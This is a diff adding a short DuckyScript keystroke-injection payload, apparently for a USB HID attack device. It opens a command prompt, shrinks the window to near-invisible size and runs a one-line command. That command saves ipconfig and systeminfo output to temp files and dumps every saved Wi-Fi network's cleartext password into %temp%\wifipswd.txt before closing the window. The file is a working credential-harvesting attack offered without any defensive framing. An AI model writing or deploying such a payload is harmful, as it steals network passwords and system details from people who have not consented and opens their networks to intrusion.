@@ -1,0 +1,14 @@
+GUI R
+DELAY 350
+STRING cmd
+DELAY 350
+ENTER
+DELAY 350
+STRING mode con: cols=15 lines=1 & mode con: cols=25 lines=1
+DELAY 350
+ENTER
+STRING ipconfig >> %temp%\ipadress.txt & systeminfo >> %temp%\sysinfo.txt & for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @if "%j" NEQ "" (echo SSID: %j & netsh wlan show profiles %j key=clear | findstr "Key Content") >> %temp%\wifipswd.txt
+DELAY 350
+ENTER
+DELAY 4500
+ALT F4
